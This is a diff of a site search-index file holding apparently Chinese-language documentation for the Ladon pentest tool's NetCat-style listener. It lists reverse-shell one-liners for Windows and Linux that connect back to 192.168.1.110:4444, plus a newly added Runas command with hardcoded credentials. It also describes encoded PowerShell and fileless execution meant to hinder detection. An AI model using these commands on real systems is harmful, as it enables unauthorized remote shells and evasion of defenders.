@@ -1220,7 +1220,7 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </tags>
   </entry>
   <entry>
-    <title>〖教程〗NC执行PowerShell/内存加载Ladon扫描</title>
+    <title>〖工具〗NC执行PowerShell/内存加载Ladon扫描</title>
     <url>/p/LadonNC.html</url>
     <content><![CDATA[<p>K8加强版NC、NetCat,可监听执行windows\Linux\Mac等系统，或多种方式反弹的Shell,对于Windows还可以自动加密执行PowerShell、以及内存加载执行Ladon扫描（无文件落地）</p>
 <a id="more"></a>
@@ -1236,6 +1236,8 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
 <h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>nc -e cmd 192.168.1.110 4444</p>
 <h4 id="linux-mac"><a href="#linux-mac" class="headerlink" title="linux/mac"></a>linux/mac</h4><p>nc -e /bin/bash 192.168.1.110 4444</p>
 <h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><p>Ladon ReverseTcp 192.168.1.110 4444 nc</p>
+<h4 id="Runas"><a href="#Runas" class="headerlink" title="Runas"></a>Runas</h4><p>Ladon Runas k8gege k8gege520 cmd.exe 192.168.1.110 4444</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/RunasNC.PNG"></p>
 <h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>其它方法反弹，Ladon也支持</p>
 <h3 id="执行CMD命令"><a href="#执行CMD命令" class="headerlink" title="执行CMD命令"></a>执行CMD命令</h3><p>不勾选PowerShell或PowerLadon，默认即是正常的CMD命令</p>
 <h3 id="执行PowerShell命令-加密"><a href="#执行PowerShell命令-加密" class="headerlink" title="执行PowerShell命令(加密)"></a>执行PowerShell命令(加密)</h3><p>优点：有一定的反查效果（虽说Base64形同虚设，但也比完全不加密好一点）<br>勾选PowerShell，在CMD框中输入PowerShell命令或代码，执行的时候自动加密<br>当然你也可以使用NC旁边的PowerShell，里面有很多随机混淆PowerShell的方法<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/ncpowershell.PNG"></p>
